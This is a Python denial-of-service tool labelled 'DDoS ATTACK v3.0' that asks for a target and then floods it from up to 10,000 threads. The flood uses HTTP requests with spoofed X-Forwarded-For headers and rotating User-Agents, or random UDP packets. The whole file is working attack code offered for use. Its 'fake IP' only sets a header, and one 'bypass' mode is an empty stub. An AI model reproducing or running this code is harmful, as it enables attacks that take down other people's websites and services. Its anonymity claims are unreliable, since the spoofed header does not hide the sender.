import requests
import threading
import time
import sys
import webbrowser
from datetime import datetime
from colorama import init, Fore, Style
import itertools
import random
import socket

# Initialize colorama
init(autoreset=True)

def loading_animation(duration=3):
    loading_text = f"{Fore.YELLOW}Starting DDoS Attack Tool"
    end_time = time.time() + duration
    for frame in itertools.cycle(['|', '/', '-', '\\']):
        sys.stdout.write(f'\r{loading_text}... {frame}')
        sys.stdout.flush()
        time.sleep(0.1)
        if time.time() > end_time:
            break
    sys.stdout.write('\r' + ' ' * (len(loading_text) + 4) + '\r')  # Clear the line

def print_banner():
    banner = f'''
       {Fore.CYAN}_______________{Style.BRIGHT}
      /                \\
     / {Fore.GREEN}DDoS ATTACK v3.0{Style.BRIGHT} \\
     \\_______________/
      |     {Fore.RED}_________{Style.BRIGHT}   |
      |    /       /    |
      |   /     @ @     |
      |   \\   ____ /     |
      |    \\______/      |
      |    ____ ___       |
      |   / ____/ _/      |
      |   \\__ _/         |
      |    ___\\ /          |
      |   /    \\_\\         |
      |                    |
      | {Fore.YELLOW}Author: YourName{Style.BRIGHT}     |
      | {Fore.YELLOW}YouTube: {Fore.BLUE}https://youtube.com/YourChannel{Style.BRIGHT}|
    '''
    print(banner)

def generate_fake_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

def display_error(message):
    error_banner = f'''
    {Fore.RED}__________{Style.BRIGHT} ERROR {Fore.RED}__________
    |                             |
    |      {Fore.YELLOW}WEBSITE REQUEST FAILED{Fore.RED}       |
    |      {Fore.YELLOW}{message}{Fore.RED}     |
    |_________________________|
    '''
    print(error_banner)

def display_success(response_url, fake_ip, user_agent):
    success_banner = f'''
    {Fore.GREEN}____________________{Style.BRIGHT} SUCCESS {Fore.GREEN}____________________
    |                                                         |
    |     {Fore.YELLOW}DDoS Attack Successful!                        |
    |     {Fore.YELLOW}Target: {response_url}                    |
    |     {Fore.YELLOW}Fake IP Used: {fake_ip}                       |
    |     {Fore.YELLOW}User-Agent: {user_agent}                    |
    |     {Fore.YELLOW}Time: {datetime.now().strftime("%H:%M:%S")}                       |
    |_________________________________________________________|
    '''
    print(success_banner)

class DDoS:
    def __init__(self, url, method='GET', pps=100):
        self.url = url
        self.method = method
        self.pps = pps  # Packets per second

        # List of 7 different User-Agent strings
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 11; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
        ]

    def attack(self):
        if self.method in ['GET', 'POST', 'HEAD', 'flood_get', 'bypass']:
            self.http_attack()
        elif self.method == 'udp':
            self.udp_attack()
        else:
            print(f"{Fore.RED}Method not supported.")
    
    def http_attack(self):
        while True:
            try:
                fake_ip = generate_fake_ip()  # Generate a fake IP
                user_agent = random.choice(self.user_agents)  # Randomly select a User-Agent
                headers = {
                    'X-Forwarded-For': fake_ip,
                    'User-Agent': user_agent
                }  # Use the fake IP and User-Agent in the headers
                if self.method == 'POST':
                    response = requests.post(self.url, headers=headers)
                elif self.method == 'GET':
                    response = requests.get(self.url, headers=headers)
                elif self.method == 'HEAD':
                    response = requests.head(self.url, headers=headers)
                elif self.method == 'flood_get':
                    self.flood_get(headers)
                elif self.method == 'bypass':
                    self.flood_bypass(headers)
                self.parse(response)
                display_success(response.url, fake_ip, user_agent)  # Display the success message
                time.sleep(1 / self.pps)  # Sleep time depends on pps
            except requests.exceptions.RequestException as e:
                if 'blocked' in str(e).lower():
                    print(f"{Fore.RED}IP blocked. Generating new IP...")
                else:
                    display_error(str(e))

    def udp_attack(self):
        try:
            target_ip, target_port = self.url.split(":")
            target_port = int(target_port)
        except ValueError:
            print(f"{Fore.RED}Error: Invalid target format. Use IP:PORT format for UDP attacks.")
            return

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(1024)  # Generate random payload of 1024 bytes

        print(f"{Fore.GREEN}Starting UDP Attack on {target_ip}:{target_port}")

        while True:
            try:
                for _ in range(self.pps):  # Send multiple packets based on PPS
                    sock.sendto(payload, (target_ip, target_port))
                # Indicate success of sending packets
                print(f"{Fore.MAGENTA}Successfully sent UDP packets to {target_ip}:{target_port}")
                time.sleep(1)  # Adjust sleep time if needed
            except Exception as e:
                # Display error if the packet could not be sent
                display_error(f"Failed to send UDP packets to {target_ip}:{target_port}. Error: {e}")
                break

    def flood_bypass(self, headers):
        # Implement your flood bypass logic here
        pass

    def flood_get(self, headers):
        while True:
            try:
                response = requests.get(self.url, headers=headers)
                self.parse(response)
                display_success(response.url, headers['X-Forwarded-For'], headers['User-Agent'])  # Display the success message
                time.sleep(1 / self.pps)  # Sleep time depends on pps
            except requests.exceptions.RequestException as e:
                if 'blocked' in str(e).lower():
                    print(f"{Fore.RED}IP blocked. Generating new IP...")
                else:
                    display_error(str(e))

    def parse(self, response):
        current_time = datetime.now().strftime("%H:%M:%S")
        print(f'{Fore.MAGENTA}{current_time} DDoS Attack with Fake IP: {response.url}')

def main():
    webbrowser.open("https://youtube.com/YourChannel")  # Redirect to YouTube

    loading_animation(duration=3)  # Loading animation runs for 3 seconds
    print_banner()
    
    target_url = input(f'{Fore.BLUE}Enter Target URL (e.g., http://example.com or 192.168.0.1:80): {Style.RESET_ALL}')
    method = input(f'{Fore.BLUE}Enter Method (GET/POST/HEAD/flood_get/bypass/udp): {Style.RESET_ALL}')
    number_of_threads = int(input(f'{Fore.BLUE}Enter Number of Threads: {Style.RESET_ALL}'))
    pps = int(input(f'{Fore.BLUE}Enter Packets per Second: {Style.RESET_ALL}'))

    if number_of_threads > 10000:
        print(f"{Fore.RED}Error: Maximum 10000 threads allowed.")
        return

    if pps > 10000:
        print(f"{Fore.RED}Error: Maximum 10000 PPS allowed.")
        return

    ddos = DDoS(target_url, method, pps)

    threads = []
    for _ in range(number_of_threads):
        thread = threading.Thread(target=ddos.attack)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == '__main__':
    main()
